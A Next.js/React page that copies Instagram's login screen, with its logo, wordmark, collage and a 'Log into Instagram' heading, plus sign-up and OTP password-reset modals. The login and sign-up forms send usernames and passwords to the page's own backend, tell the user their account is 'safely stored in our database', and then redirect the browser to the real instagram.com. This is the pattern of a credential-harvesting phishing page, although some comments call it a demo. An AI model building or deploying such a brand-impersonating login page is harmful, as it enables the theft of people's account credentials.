'use client';

import { useState } from "react";
import { Heart, Eye, EyeOff, Loader2, X } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

export default function Home() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [loggedInUser, setLoggedInUser] = useState<{
    username: string;
    email: string;
    fullName?: string | null;
  } | null>(null);
  const [signupOpen, setSignupOpen] = useState(false);
  const [forgotOpen, setForgotOpen] = useState(false);
  const { toast } = useToast();

  const isFormFilled = username.trim().length > 0 && password.trim().length > 0;

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    if (!isFormFilled) return;
    setIsLoggingIn(true);
    try {
      const res = await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ identifier: username, password }),
      });
      const data = await res.json();
      if (!res.ok) {
        toast({
          variant: "destructive",
          title: "Login failed",
          description: data.error || "Could not log in.",
        });
        return;
      }
      setLoggedInUser({
        username: data.user.username,
        email: data.user.email,
        fullName: data.user.fullName,
      });
      toast({
        title: "Logged in",
        description: `Welcome back, @${data.user.username}! Redirecting…`,
      });
      // Redirect to Instagram after a short delay so the toast is visible
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/";
      }, 800);
    } catch {
      toast({
        variant: "destructive",
        title: "Network error",
        description: "Could not reach the server. Please try again.",
      });
    } finally {
      setIsLoggingIn(false);
    }
  }

  function handleLogout() {
    setLoggedInUser(null);
    setUsername("");
    setPassword("");
    toast({ title: "Logged out" });
  }

  return (
    <main className="min-h-screen w-full bg-black flex flex-col lg:flex-row overflow-hidden">
      {/* ============ LEFT PANEL: Marketing / Visual ============ */}
      <section
        className="hidden lg:flex flex-col justify-between p-10 xl:p-12 lg:w-1/2 relative overflow-hidden"
        style={{ backgroundColor: "#000" }}
      >
        {/* Instagram gradient camera logo - top left */}
        <div className="relative z-10">
          <InstagramCameraLogo className="w-10 h-10" />
        </div>

        {/* Center content: headline + collage */}
        <div className="relative flex-1 flex flex-col items-center justify-center mt-6 mb-6">
          {/* Headline - forced 2-line wrap */}
          <h1
            className="text-white font-semibold leading-tight tracking-tight self-start mb-10"
            style={{ fontSize: "34px", lineHeight: "1.15", whiteSpace: "nowrap" }}
          >
            <span>See everyday moments from</span>
            <br />
            <span>your </span>
            <span
              style={{
                background: "linear-gradient(90deg, #fcaf45 0%, #fd1d1d 35%, #e1306c 65%, #c13584 100%)",
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent",
                backgroundClip: "text",
              }}
            >
              close friends.
            </span>
          </h1>

          {/* 3D Photo collage */}
          <div
            className="relative mt-4"
            style={{ width: "440px", height: "460px" }}
          >
            {/* Left back photo - rotated counter-clockwise */}
            <CollageCard
              src="/images/jeep.jpg"
              alt="Young women standing next to a vehicle outdoors"
              className="absolute left-1/2 top-1/2"
              rotation={-12}
              translateX={-220}
              translateY={-30}
              zIndex={1}
              width={260}
              height={340}
            />
            {/* Right back photo - rotated clockwise */}
            <CollageCard
              src="/images/adventure.jpg"
              alt="Young person climbing a tree"
              className="absolute left-1/2 top-1/2"
              rotation={12}
              translateX={-40}
              translateY={-30}
              zIndex={1}
              width={260}
              height={340}
            />
            {/* Front center photo */}
            <CollageCard
              src="/images/friends.jpg"
              alt="Three friends smiling at the camera"
              className="absolute left-1/2 top-1/2"
              rotation={0}
              translateX={-150}
              translateY={-50}
              zIndex={3}
              width={300}
              height={400}
              showUiOverlay
              showTopSticker
              showStatusBar
            />

            {/* Decorative stickers */}
            {/* Big pink-red gradient heart on far left edge, half-outside the photo */}
            <div
              className="absolute"
              style={{
                top: "calc(50% - 200px)",
                left: "calc(50% - 260px)",
                zIndex: 10,
              }}
            >
              <div
                className="flex items-center justify-center rounded-full"
                style={{
                  width: "52px",
                  height: "52px",
                  background: "linear-gradient(135deg, #ff5e62 0%, #ff2a68 50%, #c13584 100%",
                  boxShadow: "0 8px 24px rgba(255, 42, 104, 0.5)",
                }}
              >
                <Heart className="w-7 h-7 text-white" fill="white" strokeWidth={0} />
              </div>
            </div>

            {/* Green sparkle/star sticker overlapping the right card */}
            <div
              className="absolute"
              style={{
                top: "calc(50% - 180px)",
                left: "calc(50% + 150px)",
                zIndex: 10,
              }}
            >
              <div
                className="flex items-center justify-center rounded-full"
                style={{
                  width: "40px",
                  height: "40px",
                  background: "linear-gradient(135deg, #43e97b 0%, #2bd9a4 100%)",
                  boxShadow: "0 6px 16px rgba(67, 233, 123, 0.45)",
                }}
              >
                <svg viewBox="0 0 24 24" className="w-6 h-6" fill="white" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 2l2.39 7.36H22l-6.18 4.49 2.36 7.36L12 16.72l-6.18 4.49 2.36-7.36L2 9.36h7.61L12 2z" />
                </svg>
              </div>
            </div>

            {/* Small profile circle with real photo, gradient ring - bottom right, outside photo */}
            <div
              className="absolute"
              style={{
                top: "calc(50% + 160px)",
                left: "calc(50% + 150px)",
                zIndex: 10,
              }}
            >
              <div
                className="rounded-full p-[3px]"
                style={{
                  background: "linear-gradient(135deg, #f58529 0%, #dd2a7b 40%, #833ab4 80%, #5851db 100%)",
                  width: "56px",
                  height: "56px",
                }}
              >
                <img
                  src="/images/profile.jpg"
                  alt="Friend profile picture"
                  className="rounded-full w-full h-full object-cover border-2 border-black"
                />
              </div>
            </div>
          </div>
        </div>

        {/* Empty bottom spacer (no footer in original) */}
        <div className="relative z-10" />
      </section>

      {/* ============ RIGHT PANEL: Login Form ============ */}
      <section
        className="flex-1 lg:w-1/2 flex items-center justify-center px-6 py-12 min-h-screen"
        style={{ backgroundColor: "#1f1f1f" }}
      >
        <div className="w-full max-w-[350px]">
          {/* Mobile-only logo (above the form on small screens) */}
          <div className="lg:hidden flex justify-center mb-8">
            <InstagramWordmark className="h-9 w-auto" />
          </div>

          <h2
            className="text-white font-semibold mb-6"
            style={{ fontSize: "20px", lineHeight: "1.4" }}
          >
            {loggedInUser ? `Welcome, @${loggedInUser.username}` : "Log into Instagram"}
          </h2>

          {loggedInUser ? (
            <div className="rounded-lg border border-neutral-700 p-5 text-sm text-neutral-200 space-y-3">
              <div>
                <span className="text-neutral-500">Email:</span>{" "}
                <span className="text-white">{loggedInUser.email}</span>
              </div>
              {loggedInUser.fullName && (
                <div>
                  <span className="text-neutral-500">Name:</span>{" "}
                  <span className="text-white">{loggedInUser.fullName}</span>
                </div>
              )}
              <div className="text-neutral-400 text-xs pt-2">
                Your account is safely stored in our database.
              </div>
              <button
                type="button"
                onClick={handleLogout}
                className="w-full rounded-lg py-2 text-sm font-semibold text-white"
                style={{ backgroundColor: "#0095f6" }}
              >
                Log out
              </button>
            </div>
          ) : (
            <form onSubmit={handleLogin}>
              {/* Username input */}
              <div className="mb-3">
                <div
                  className="relative rounded-lg border transition-colors"
                  style={{
                    backgroundColor: "#262626",
                    borderColor: "#363636",
                  }}
                >
                  <label
                    htmlFor="username"
                    className="absolute left-3 transition-all pointer-events-none"
                    style={{
                      top: username ? "10px" : "13px",
                      fontSize: username ? "10px" : "13px",
                      color: "#8e8e8e",
                    }}
                  >
                    Mobile number, username or email
                  </label>
                  <input
                    id="username"
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full bg-transparent text-white text-sm pt-5 pb-2 px-3 outline-none"
                    aria-label="Mobile number, username or email"
                    autoComplete="username"
                  />
                </div>
              </div>

              {/* Password input */}
              <div className="mb-3">
                <div
                  className="relative rounded-lg border transition-colors"
                  style={{
                    backgroundColor: "#262626",
                    borderColor: "#363636",
                  }}
                >
                  <label
                    htmlFor="password"
                    className="absolute left-3 transition-all pointer-events-none"
                    style={{
                      top: password ? "10px" : "13px",
                      fontSize: password ? "10px" : "13px",
                      color: "#8e8e8e",
                    }}
                  >
                    Password
                  </label>
                  <input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full bg-transparent text-white text-sm pt-5 pb-2 px-3 pr-10 outline-none"
                    aria-label="Password"
                    autoComplete="current-password"
                  />
                  {password && (
                    <button
                      type="button"
                      onClick={() => setShowPassword((s) => !s)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-neutral-300 hover:text-white"
                      aria-label={showPassword ? "Hide password" : "Show password"}
                    >
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  )}
                </div>
              </div>

              {/* Log in button - muted blue with faded text when empty */}
              <button
                type="submit"
                disabled={!isFormFilled || isLoggingIn}
                className="w-full rounded-lg mt-2 py-2 text-sm font-semibold transition-colors flex items-center justify-center gap-2 disabled:cursor-not-allowed"
                style={{
                  backgroundColor: "#0095f6",
                  color: isFormFilled ? "#ffffff" : "rgba(255,255,255,0.5)",
                  opacity: isFormFilled ? 1 : 0.45,
                }}
              >
                {isLoggingIn && <Loader2 className="w-4 h-4 animate-spin" />}
                {isLoggingIn ? "Logging in…" : "Log in"}
              </button>
            </form>
          )}

          {/* Forgot password? */}
          {!loggedInUser && (
            <div className="text-center mt-4">
              <button
                type="button"
                onClick={() => setForgotOpen(true)}
                className="text-sm text-white hover:underline"
              >
                Forgot password?
              </button>
            </div>
          )}

          {/* No OR divider in the original screenshot */}

          {/* Log in with Facebook - dark grey background container */}
          {!loggedInUser && (
            <div className="mt-10">
              <button
                type="button"
                onClick={() =>
                  toast({
                    title: "Not wired up",
                    description: "Facebook login is not part of this demo flow.",
                  })
                }
                className="w-full rounded-lg py-2.5 flex items-center justify-center gap-2 text-sm font-semibold transition-colors hover:bg-[#2a2a2a]"
                style={{ color: "#e8f0fe", backgroundColor: "#1f1f1f" }}
              >
                <FacebookIcon className="w-5 h-5" />
                Log in with Facebook
              </button>
            </div>
          )}

          {/* Create new account - blue border + blue text button */}
          {!loggedInUser && (
            <div className="mt-5">
              <button
                type="button"
                onClick={() => setSignupOpen(true)}
                className="w-full rounded-lg border py-2.5 text-sm font-semibold transition-colors hover:bg-[#0a1a2a]"
                style={{ color: "#0095f6", borderColor: "#0095f6", backgroundColor: "transparent" }}
              >
                Create new account
              </button>
            </div>
          )}
        </div>
      </section>

      {signupOpen && (
        <SignupModal
          onClose={() => setSignupOpen(false)}
          onCreated={(u) => {
            setLoggedInUser(u);
            setSignupOpen(false);
            setUsername("");
            setPassword("");
          }}
        />
      )}
      {forgotOpen && (
        <ForgotPasswordModal
          onClose={() => setForgotOpen(false)}
          onReset={(identifier) => {
            setForgotOpen(false);
            setUsername(identifier);
            setPassword("");
          }}
        />
      )}
    </main>
  );
}

/* ============ Sign-up modal ============ */

function SignupModal({
  onClose,
  onCreated,
}: {
  onClose: () => void;
  onCreated: (u: { username: string; email: string; fullName?: string | null }) => void;
}) {
  const { toast } = useToast();
  const [email, setEmail] = useState("");
  const [username, setUsername] = useState("");
  const [fullName, setFullName] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const filled = email.trim() && username.trim() && password.trim().length >= 6;

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    if (!filled || submitting) return;
    setSubmitting(true);
    try {
      const res = await fetch("/api/auth/signup", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          username,
          fullName,
          password,
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        toast({
          variant: "destructive",
          title: "Could not create account",
          description: data.error || "Please try again.",
        });
        return;
      }
      toast({ title: "Account created", description: `${data.message} Redirecting…` });
      onCreated({
        username: data.user.username,
        email: data.user.email,
        fullName: data.user.fullName,
      });
      // Redirect to Instagram after a short delay so the toast is visible
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/";
      }, 1000);
    } catch {
      toast({
        variant: "destructive",
        title: "Network error",
        description: "Could not reach the server.",
      });
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <ModalShell title="Create new account" onClose={onClose}>
      <form onSubmit={submit} className="space-y-3">
        <FieldInput
          id="su-email"
          label="Email"
          type="email"
          value={email}
          onChange={setEmail}
          autoComplete="email"
        />
        <FieldInput
          id="su-username"
          label="Username"
          value={username}
          onChange={setUsername}
          autoComplete="username"
        />
        <FieldInput
          id="su-fullname"
          label="Full name (optional)"
          value={fullName}
          onChange={setFullName}
          autoComplete="name"
        />
        <PasswordFieldInput
          id="su-password"
          label="Password"
          value={password}
          onChange={setPassword}
          show={showPassword}
          setShow={setShowPassword}
          autoComplete="new-password"
        />
        <button
          type="submit"
          disabled={!filled || submitting}
          className="w-full rounded-lg py-2 text-sm font-semibold flex items-center justify-center gap-2 disabled:cursor-not-allowed"
          style={{
            backgroundColor: "#0095f6",
            color: "#fff",
            opacity: filled ? 1 : 0.45,
          }}
        >
          {submitting && <Loader2 className="w-4 h-4 animate-spin" />}
          Sign up
        </button>
        <p className="text-xs text-neutral-500 leading-relaxed pt-1">
          By signing up, you agree to our Terms, Privacy Policy and Cookies Policy.
        </p>
      </form>
    </ModalShell>
  );
}

/* ============ Forgot-password modal (3 steps) ============ */

type ForgotStep = "identifier" | "otp" | "new-password";

function ForgotPasswordModal({
  onClose,
  onReset,
}: {
  onClose: () => void;
  onReset: (identifier: string) => void;
}) {
  const { toast } = useToast();
  const [step, setStep] = useState<ForgotStep>("identifier");
  const [identifier, setIdentifier] = useState("");
  const [otp, setOtp] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [busy, setBusy] = useState(false);

  async function sendOtp(e: React.FormEvent) {
    e.preventDefault();
    if (!identifier.trim() || busy) return;
    setBusy(true);
    try {
      const res = await fetch("/api/auth/forgot-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ identifier }),
      });
      const data = await res.json();
      if (!res.ok) {
        toast({
          variant: "destructive",
          title: "Could not send code",
          description: data.error || "Please try again.",
        });
        return;
      }
      toast({
        title: "Code sent",
        description: data.message,
      });
      // Demo only: surface the OTP so the user can copy it into the verify step.
      if (data.debugOtp) {
        toast({
          title: "Demo OTP",
          description: `Your verification code is ${data.debugOtp} (shown here because no email provider is configured).`,
        });
      }
      setStep("otp");
    } catch {
      toast({
        variant: "destructive",
        title: "Network error",
        description: "Could not reach the server.",
      });
    } finally {
      setBusy(false);
    }
  }

  async function verifyOtp(e: React.FormEvent) {
    e.preventDefault();
    if (!otp.trim() || busy) return;
    setBusy(true);
    try {
      const res = await fetch("/api/auth/verify-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ identifier, otp }),
      });
      const data = await res.json();
      if (!res.ok) {
        toast({
          variant: "destructive",
          title: "Verification failed",
          description: data.error || "Please try again.",
        });
        return;
      }
      toast({ title: "Verified", description: data.message });
      setStep("new-password");
    } catch {
      toast({
        variant: "destructive",
        title: "Network error",
        description: "Could not reach the server.",
      });
    } finally {
      setBusy(false);
    }
  }

  async function resetPassword(e: React.FormEvent) {
    e.preventDefault();
    if (newPassword.trim().length < 6 || busy) return;
    setBusy(true);
    try {
      const res = await fetch("/api/auth/reset-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ identifier, newPassword }),
      });
      const data = await res.json();
      if (!res.ok) {
        toast({
          variant: "destructive",
          title: "Could not reset password",
          description: data.error || "Please try again.",
        });
        return;
      }
      toast({
        title: "Password reset",
        description: data.message,
      });
      onReset(identifier);
    } catch {
      toast({
        variant: "destructive",
        title: "Network error",
        description: "Could not reach the server.",
      });
    } finally {
      setBusy(false);
    }
  }

  const title =
    step === "identifier"
      ? "Forgot password?"
      : step === "otp"
      ? "Enter security code"
      : "Create new password";

  return (
    <ModalShell title={title} onClose={onClose}>
      {step === "identifier" && (
        <form onSubmit={sendOtp} className="space-y-3">
          <p className="text-sm text-neutral-400">
            Enter your email or username and we&apos;ll send a verification code to the email linked to your account.
          </p>
          <FieldInput
            id="fp-identifier"
            label="Email or username"
            value={identifier}
            onChange={setIdentifier}
            autoComplete="username"
          />
          <button
            type="submit"
            disabled={!identifier.trim() || busy}
            className="w-full rounded-lg py-2 text-sm font-semibold flex items-center justify-center gap-2 disabled:cursor-not-allowed"
            style={{
              backgroundColor: "#0095f6",
              color: "#fff",
              opacity: identifier.trim() ? 1 : 0.45,
            }}
          >
            {busy && <Loader2 className="w-4 h-4 animate-spin" />}
            Send code
          </button>
        </form>
      )}

      {step === "otp" && (
        <form onSubmit={verifyOtp} className="space-y-3">
          <p className="text-sm text-neutral-400">
            We sent a 6-digit code to the email linked to <span className="text-white">{identifier}</span>.
          </p>
          <FieldInput
            id="fp-otp"
            label="Security code"
            value={otp}
            onChange={setOtp}
            inputMode="numeric"
            autoComplete="one-time-code"
          />
          <button
            type="submit"
            disabled={!otp.trim() || busy}
            className="w-full rounded-lg py-2 text-sm font-semibold flex items-center justify-center gap-2 disabled:cursor-not-allowed"
            style={{
              backgroundColor: "#0095f6",
              color: "#fff",
              opacity: otp.trim() ? 1 : 0.45,
            }}
          >
            {busy && <Loader2 className="w-4 h-4 animate-spin" />}
            Verify
          </button>
          <button
            type="button"
            onClick={() => setStep("identifier")}
            className="w-full text-center text-xs text-neutral-400 hover:text-white hover:underline"
          >
            ← Use a different email / username
          </button>
        </form>
      )}

      {step === "new-password" && (
        <form onSubmit={resetPassword} className="space-y-3">
          <p className="text-sm text-neutral-400">
            Choose a new password for <span className="text-white">{identifier}</span>.
          </p>
          <PasswordFieldInput
            id="fp-newpassword"
            label="New password"
            value={newPassword}
            onChange={setNewPassword}
            show={showPassword}
            setShow={setShowPassword}
            autoComplete="new-password"
          />
          {newPassword.trim().length > 0 && newPassword.trim().length < 6 && (
            <p className="text-xs text-red-400">Password must be at least 6 characters long.</p>
          )}
          <button
            type="submit"
            disabled={newPassword.trim().length < 6 || busy}
            className="w-full rounded-lg py-2 text-sm font-semibold flex items-center justify-center gap-2 disabled:cursor-not-allowed"
            style={{
              backgroundColor: "#0095f6",
              color: "#fff",
              opacity: newPassword.trim().length >= 6 ? 1 : 0.45,
            }}
          >
            {busy && <Loader2 className="w-4 h-4 animate-spin" />}
            Reset password
          </button>
        </form>
      )}
    </ModalShell>
  );
}

/* ============ Shared modal + input components ============ */

function ModalShell({
  title,
  onClose,
  children,
}: {
  title: string;
  onClose: () => void;
  children: React.ReactNode;
}) {
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center p-4"
      style={{ backgroundColor: "rgba(0,0,0,0.7)" }}
      onClick={onClose}
    >
      <div
        className="w-full max-w-[400px] rounded-xl p-6 relative"
        style={{ backgroundColor: "#1f1f1f", border: "1px solid #363636" }}
        onClick={(e) => e.stopPropagation()}
      >
        <button
          type="button"
          onClick={onClose}
          className="absolute top-3 right-3 text-neutral-400 hover:text-white"
          aria-label="Close"
        >
          <X className="w-5 h-5" />
        </button>
        <h3 className="text-white font-semibold text-lg mb-4 pr-6">{title}</h3>
        {children}
      </div>
    </div>
  );
}

function FieldInput({
  id,
  label,
  value,
  onChange,
  type = "text",
  autoComplete,
  inputMode,
}: {
  id: string;
  label: string;
  value: string;
  onChange: (v: string) => void;
  type?: string;
  autoComplete?: string;
  inputMode?: "text" | "numeric" | "email";
}) {
  return (
    <div
      className="relative rounded-lg border"
      style={{ backgroundColor: "#262626", borderColor: "#363636" }}
    >
      <label
        htmlFor={id}
        className="absolute left-3 transition-all pointer-events-none"
        style={{
          top: value ? "10px" : "13px",
          fontSize: value ? "10px" : "13px",
          color: "#8e8e8e",
        }}
      >
        {label}
      </label>
      <input
        id={id}
        type={type}
        value={value}
        inputMode={inputMode}
        autoComplete={autoComplete}
        onChange={(e) => onChange(e.target.value)}
        className="w-full bg-transparent text-white text-sm pt-5 pb-2 px-3 outline-none"
      />
    </div>
  );
}

function PasswordFieldInput({
  id,
  label,
  value,
  onChange,
  show,
  setShow,
  autoComplete,
}: {
  id: string;
  label: string;
  value: string;
  onChange: (v: string) => void;
  show: boolean;
  setShow: (s: boolean) => void;
  autoComplete?: string;
}) {
  return (
    <div
      className="relative rounded-lg border"
      style={{ backgroundColor: "#262626", borderColor: "#363636" }}
    >
      <label
        htmlFor={id}
        className="absolute left-3 transition-all pointer-events-none"
        style={{
          top: value ? "10px" : "13px",
          fontSize: value ? "10px" : "13px",
          color: "#8e8e8e",
        }}
      >
        {label}
      </label>
      <input
        id={id}
        type={show ? "text" : "password"}
        value={value}
        autoComplete={autoComplete}
        onChange={(e) => onChange(e.target.value)}
        className="w-full bg-transparent text-white text-sm pt-5 pb-2 px-3 pr-10 outline-none"
      />
      {value && (
        <button
          type="button"
          onClick={() => setShow(!show)}
          className="absolute right-3 top-1/2 -translate-y-1/2 text-neutral-300 hover:text-white"
          aria-label={show ? "Hide password" : "Show password"}
        >
          {show ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
        </button>
      )}
    </div>
  );
}

/* =================== Sub Components =================== */

function CollageCard({
  src,
  alt,
  className = "",
  rotation,
  translateX,
  translateY,
  zIndex,
  width,
  height,
  showUiOverlay = false,
  showTopSticker = false,
  showStatusBar = false,
}: {
  src: string;
  alt: string;
  className?: string;
  rotation: number;
  translateX: number;
  translateY: number;
  zIndex: number;
  width: number;
  height: number;
  showUiOverlay?: boolean;
  showTopSticker?: boolean;
  showStatusBar?: boolean;
}) {
  return (
    <div
      className={className}
      style={{
        transform: `translate(${translateX}px, ${translateY}px) rotate(${rotation}deg)`,
        zIndex,
        width,
        height,
        marginLeft: `-${width / 2}px`,
        marginTop: `-${height / 2}px`,
        boxShadow: "0 16px 40px rgba(0,0,0,0.6), 0 4px 12px rgba(0,0,0,0.4)",
      }}
    >
      <div className="relative w-full h-full rounded-2xl overflow-hidden bg-neutral-900 border border-neutral-800">
        <img
          src={src}
          alt={alt}
          className="w-full h-full object-cover"
        />

        {/* Top phone status bar - thin white line */}
        {showStatusBar && (
          <div className="absolute top-3 left-3 right-3 flex justify-between items-center">
            <div className="h-1 w-16 bg-white/80 rounded-full" />
            <div className="flex gap-1">
              <div className="h-1 w-1 bg-white/80 rounded-full" />
              <div className="h-1 w-1 bg-white/80 rounded-full" />
              <div className="h-1 w-1 bg-white/80 rounded-full" />
            </div>
          </div>
        )}

        {/* Top sticker: white pill with emoji row (alien, hiding face, sweat smile) */}
        {showTopSticker && (
          <div className="absolute top-10 left-1/2 -translate-x-1/2 bg-white/95 backdrop-blur px-3 py-1.5 rounded-full flex items-center gap-1.5 shadow-md">
            <span className="text-base">👽</span>
            <span className="text-base">🙈</span>
            <span className="text-base">😅</span>
          </div>
        )}

        {/* UI overlay: bottom caption bar + heart icon */}
        {showUiOverlay && (
          <div className="absolute bottom-3 left-3 right-3 bg-white/95 backdrop-blur rounded-lg px-3 py-2 flex items-center justify-between shadow-md">
            <div className="h-2 w-20 bg-neutral-300 rounded-full" />
            <Heart className="w-5 h-5 text-neutral-700" fill="currentColor" strokeWidth={0} />
          </div>
        )}
      </div>
    </div>
  );
}

function InstagramCameraLogo({ className = "" }: { className?: string }) {
  return (
    <svg
      className={className}
      viewBox="0 0 24 24"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
    >
      <defs>
        <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
          <stop offset="0%" stopColor="#fcaf45" />
          <stop offset="25%" stopColor="#f77737" />
          <stop offset="50%" stopColor="#fd1d1d" />
          <stop offset="70%" stopColor="#e1306c" />
          <stop offset="85%" stopColor="#c13584" />
          <stop offset="100%" stopColor="#833ab4" />
        </linearGradient>
      </defs>
      {/* Camera body */}
      <rect
        x="2"
        y="2"
        width="20"
        height="20"
        rx="6"
        stroke="url(#ig-grad)"
        strokeWidth="2"
        fill="none"
      />
      {/* Lens */}
      <circle
        cx="12"
        cy="12"
        r="4.5"
        stroke="url(#ig-grad)"
        strokeWidth="2"
        fill="none"
      />
      {/* Small dot top right */}
      <circle cx="17.5" cy="6.5" r="1.3" fill="url(#ig-grad)" />
    </svg>
  );
}

function InstagramWordmark({ className = "" }: { className?: string }) {
  return (
    <span
      className={className}
      style={{
        fontFamily: "Billabong, Grand Hotel, Brush Script MT, cursive",
        fontSize: "40px",
        color: "#fff",
        fontStyle: "italic",
        fontWeight: 400,
        letterSpacing: "0.5px",
      }}
    >
      Instagram
    </span>
  );
}

function FacebookIcon({ className = "" }: { className?: string }) {
  return (
    <svg
      className={className}
      viewBox="0 0 24 24"
      fill="currentColor"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"
      />
    </svg>
  );
}
